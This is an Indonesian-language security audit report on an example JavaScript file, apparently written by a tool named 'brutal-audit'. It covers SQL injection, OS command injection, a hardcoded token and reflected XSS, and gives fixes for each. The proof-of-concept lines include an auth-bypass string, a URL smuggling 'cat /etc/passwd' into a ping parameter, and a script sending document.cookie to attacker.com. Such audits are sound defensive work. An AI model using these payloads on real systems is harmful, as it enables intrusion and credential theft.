# 📊 Laporan Hasil Audit brutal-audit

**Target File**: `examples/vulnerable-code.js`

### 📊 Ringkasan Audit
| Severity | Jumlah Temuan | Komponen / Fitur Terdampak |
| :--- | :---: | :--- |
| 🔴 CRITICAL | 2 | Endpoint Login (SQLi) & Endpoint Ping (Command Injection) |
| 🟠 HIGH | 1 | Token Generator pada Login |
| 🟡 MEDIUM | 1 | Endpoint Greet (Reflected XSS) |
| 🔵 LOW | 0 | - |

---

### 🔴 [CRITICAL] SQL Injection (Authentication Bypass)
- **Lokasi**: `examples/vulnerable-code.js` | **Baris**: 12
- **Kode Berbahaya**:
```javascript
const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
```
- **Eksploitasi (PoC)**: Attacker mengirimkan payload `' OR '1'='1` pada field `email`. Query SQL terangkai menjadi `SELECT * FROM users WHERE email = '' OR '1'='1' AND password = '...'`. Hasil evaluasi selalu TRUE, mengembalikan baris pertama tabel (user admin) tanpa perlu password.
- **Solusi KONKRET**:
```javascript
const query = 'SELECT * FROM users WHERE email = $1 AND password = $2';
const result = await db.query(query, [email, password]);
```
- **Referensi**: OWASP Top 10:2021-A03 (Injection), CWE-89.

---

### 🔴 [CRITICAL] Remote Command Injection (OS Takeover)
- **Lokasi**: `examples/vulnerable-code.js` | **Baris**: 26
- **Kode Berbahaya**:
```javascript
exec(`ping -c 1 ${host}`, (err, stdout, stderr) => {
```
- **Eksploitasi (PoC)**: Attacker mengakses URL `http://target/ping?host=127.0.0.1;cat /etc/passwd`. Karakter `;` mengeksekusi perintah kedua langsung di sistem operasi dengan privasi akun server.
- **Solusi KONKRET**:
```javascript
const { execFile } = require('child_process');
// Validasi ketat format IP/Hostname menggunakan regex
if (!/^[a-zA-Z0-9.-]+$/.test(host)) {
  return res.status(400).send('Invalid hostname format');
}
execFile('ping', ['-c', '1', host], (err, stdout, stderr) => {
  if (err) return res.status(500).send(err.message);
  res.send(stdout);
});
```
- **Referensi**: OWASP Top 10:2021-A03 (Injection), CWE-78.

---

### 🟠 [HIGH] Hardcoded Static Secret Token
- **Lokasi**: `examples/vulnerable-code.js` | **Baris**: 17
- **Kode Berbahaya**:
```javascript
res.json({ token: "SUPER_SECRET_STATIC_JWT_KEY_12345", user: result.rows[0] });
```
- **Eksploitasi (PoC)**: Token autentikasi bersifat statis dan tersimpan di dalam source code. Siapa pun yang mendapatkan respons token ini memiliki token identik untuk seluruh user.
- **Solusi KONKRET**:
```javascript
const jwt = require('jsonwebtoken');
const token = jwt.sign(
  { id: result.rows[0].id, email: result.rows[0].email },
  process.env.JWT_SECRET,
  { expiresIn: '1h' }
);
res.json({ token, user: result.rows[0] });
```
- **Referensi**: OWASP Top 10:2021-A07 (Identification and Authentication Failures), CWE-798.

---

### 🟡 [MEDIUM] Reflected Cross-Site Scripting (XSS)
- **Lokasi**: `examples/vulnerable-code.js` | **Baris**: 35
- **Kode Berbahaya**:
```javascript
res.send(`<h1>Halo, ${name}!</h1>`);
```
- **Eksploitasi (PoC)**: Attacker mengirimkan link `http://target/greet?name=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>`. Script dieksekusi di browser korban.
- **Solusi KONKRET**:
```javascript
// Gunakan template engine atau library sanitasi seperti he / sanitize-html
const escapeHtml = (str) => String(str).replace(/[&<>"']/g, (m) => ({
  '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
}[m]));

res.send(`<h1>Halo, ${escapeHtml(name)}!</h1>`);
```
- **Referensi**: OWASP Top 10:2021-A03 (Injection - XSS), CWE-79.

---

### 🛡️ Status 5 Ranah Kritis
- **Hardcoded Secrets**: Terdeteksi 1 celah (🟠 HIGH di baris 17).
- **Injection**: Terdeteksi 2 celah (🔴 CRITICAL: SQLi baris 12 & Command Injection baris 26).
- **Broken Authentication & Session**: Terdeteksi (Ketiadaan rate limiting pada `/login`).
- **Cross-Site Scripting (XSS)**: Terdeteksi 1 celah (🟡 MEDIUM di baris 35).
- **Dependency Vulnerability**: ✅ Aman: Tidak ditemukan dependency vulnerability langsung pada kode cuplikan.

---

### ✅ Status Akhir
Sistem ini **TIDAK AMAN** untuk diproduksi.
**Blocker**: Segera perbaiki celah Command Injection di endpoint `/ping` dan SQL Injection di endpoint `/login` sebelum sistem ini terhubung ke jaringan publik!
